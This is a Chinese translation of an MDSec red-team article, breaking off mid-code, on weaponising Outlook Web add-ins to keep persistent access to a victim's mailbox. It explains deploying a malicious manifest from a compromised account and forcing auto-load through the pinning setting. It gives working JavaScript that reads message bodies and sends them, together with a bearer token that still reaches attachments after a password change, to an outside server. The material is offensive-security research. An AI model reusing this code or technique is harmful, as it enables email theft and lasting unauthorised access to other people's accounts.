# 如何滥用Office Web加载项
|
##### 译文声明
本文是翻译文章，文章原作者 mdsec，文章来源：mdsec.co.uk
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 一、背景
开发者可以使用Office加载项（add-ins）平台来扩展Office应用功能、与文档内容进行交互。加载项使用HTML、CSS以及JavaScript语言开发，使用JavaScript与Office平台交互。
所有的Office产品中都包含对应的API，但本文主要关注的是Outlook这款产品。
开发者可以使用一个manifest（清单）文件来部署加载项，该文件中包含加载项对应的名称以及URL，其他所有文件（包括HTML以及JavaScript）都托管在我们自己的基础设施上。
加载项必须使用HTTPS协议进行通信，因此我们首先需要一个有效的HTTPS证书。在本文中，我在Digital Ocean
droplet中运行一个Apache实例，使用了Let’s Encrypt提供的证书。
## 二、已有研究成果
本文的某些灵感来自于Mike Felch和Beau Bullock去年在Wild West Hackin’
Fest上做的一次[演讲](https://www.youtube.com/watch?v=XFk-b0aT6cs)，演讲视频大约从第20分钟开始涉及这方面内容，主要关注的是可以在XSS攻击中使用的Web加载项。
在本文中，我们将展示如何构建加载项，以便持久访问受害者的邮箱账户。
## 三、构建加载项
如果安装了相应功能，那么Visual Studio可以支持三种加载项的开发。我们需要安装“Office/SharePoint
development”功能，才能使用VS开发加载项类型的项目。需要注意的是，即使不使用VS，我们也能创建这些加载项。Yeoman提供了一个加载项生成器，我们也可以使用文本编辑器，手动开发代码。
一旦我们创建适用于Outlook的加载项项目，VS就会帮我们构建一个基本的加载项，该加载项可以显示用户所收的电子邮件的相关信息。生成的加载项如下图所示，已部署到Office365中：
看起来可能效果一般，但我们的确可以访问所有的消息内容。
## 四、部署加载项
现在我们已经使用VS生成了一个基本的加载项，在修改加载项代码之前，我们需要仔细研究一下加载项的部署方式，了解这种方式对攻击过程的影响。
每个加载项都包含一个manifest文件，该文件是一个XML文档，其中包含加载项名称、某些配置选项以及资源地址。文件部分内容如下图所示，其中显示了我们的加载项所加载的部分资源：
我们只需要这个文件就可以部署加载项，可以通过Office 365的web页面来部署：
在“Settings”页面中，我们可以看到一个“Manage add-ins”菜单项。在“My add-ins”页面中，我们可以找到自定义加载项选项，其中下拉列表中就包含上传manifest文件的选项。
我们只需上传manifest文件，O365就可以帮我们安装相应的加载项。
作为攻击者，我们需要想办法向受害者部署我们的加载项。一旦我们通过O365
web页面部署加载项，加载项就会同步到该账户的每个会话。这意味着我们可以从我们自己设备访问受害者账户，部署恶意加载项，并让加载项自动与受害者的浏览器同步。需要注意的是，虽然受害者不必注销，但必须重新加载Outlook
webapp，才能使改动生效。
我们还需要将加载项文件拷贝到我们的服务器上，包括HTML、CSS、JavaScript以及其他图像文件。
## 五、自动执行
为了武器化我们的加载项，我们需要让加载项能够自动执行：受害者无需点击按钮就能触发攻击行为。微软并不支持web加载项的自动执行，然而我们可以通过一些“黑科技”来完成这个任务。
如果我们观察前面VS生成的加载项，我们可以看到一个“pin”（固定）图标。该图标的功能非常明显，可以让Outlook保持该加载项处于打开状态，无需通过按钮点击来加载。我们需要启用该功能才能显示该图标，单纯生成加载项并不会出现该图标。
为了启用pin功能，我们需要修改manifest文件，添加`SupportsPinning`元素。只有schema为1.1版的manifest才支持这个元素，因此我们还需要覆盖这个字段。大家可以参考[此处](https://github.com/OfficeDev/outlook-dev-docs/blob/master/docs/add-ins/pinnable-taskpane.md)资料了解完整的示例。
覆盖版本号后，我们可以在manifest文件的`Action`标签中添加`SupportsPinning`标签，如下所示：
        true
pin图标的状态（代表加载项是否保持加载状态）也会在使用O365账户的所有浏览器上同步，这意味着我们可以在自己的设备上访问目标i账户，部署并固定加载项。当受害者下一次访问自己的账户时，就会自动加载并执行我们的加载项。
## 六、读取邮件
既然我们可以部署自己的加载项，然后自动执行加载项，现在我们可以开始构造功能更丰富的加载项。在本文中，我们的目标是读取受害者的邮件。我们可以扩展攻击范围，比如用来发送消息、查看计划安排等，但就本文的演示场景而言，读取消息内容已经能够满足我们需求。
VS已经帮我们生成了我们所需的大部分代码。首先，我们需要访问`item`对象，我们可以通过`Office.context.mailbox.item`对象来访问`item`对象，该对象中包含与消息有关的所有值，如发件人、主题以及附件详情等。我们必须使用异步调用来访问邮件正文，例如，我们可以使用如下代码来访问某个`item`的正文内容：
    // Load properties from the Item base object, then load the
    // message-specific properties.
    function loadProps(args) {
        var item = args;
        var bodyText = "";
        var body = item.body;
        body.getAsync(Office.CoercionType.Text, function (asyncResult) {
            if (asyncResult.status !== Office.AsyncResultStatus.Succeeded) {
            }
            else {
                bodyText = asyncResult.value.trim();
                sendData(item, bodyText, serviceRequest);
            }
        });
    }
上述代码中的`sendData()`会将数据传回我们的服务器。在本文的演示场景中，我会使用同一台服务器来托管我们的加载项文件，但这并不是攻击的必要条件。该函数的代码非常简单，如下所示：
    //Send data to our server
    function sendData(item, body, attachmentToken) {
        var item_data = JSON.stringify(item);
        var body_data = JSON.stringify(body);
        var token_data = JSON.stringify(attachmentToken)
        $.ajax({
        url: 'https://www.two06.info:8000/listen',
        type: 'post',
        data: { item: item_data, item_body: body_data, token: token_data },
        success: function (response) {
            //todo
        }
        });
    }
在上述代码中大家可能会注意到`attachmentToken`这个值。我们无法通过JavaScript
API访问附件，虽然我们可以获取附件名及其他细节，但无法访问具体文件。为了访问附件，我们需要使用EWS
API。虽然我们可以直接使用受害者的凭据来向该API发起身份认证请求，但也可以使用JavaScript API获取Bearer
Token，利用该令牌访问附件。通过这种方式，即使受害者修改了密码，我们也能成功访问附件。我们可以使用另一个异步调用来获取令牌，如下所示：
    var serviceRequest = {
            attachmentToken: ''
        };
        function attachmentTokenCallback(asyncResult, userContext) {
            if (asyncResult.status === "succeeded") {
                //cache the result
                serviceRequest.attachmentToken = asyncResult.value;
            }
        }
        //Grab a token to access attachments
        function getAttachmentToken() {
            if (serviceRequest.attachmentToken == "") {
                Office.context.mailbox.getCallbackTokenAsync(attachmentTokenCallback);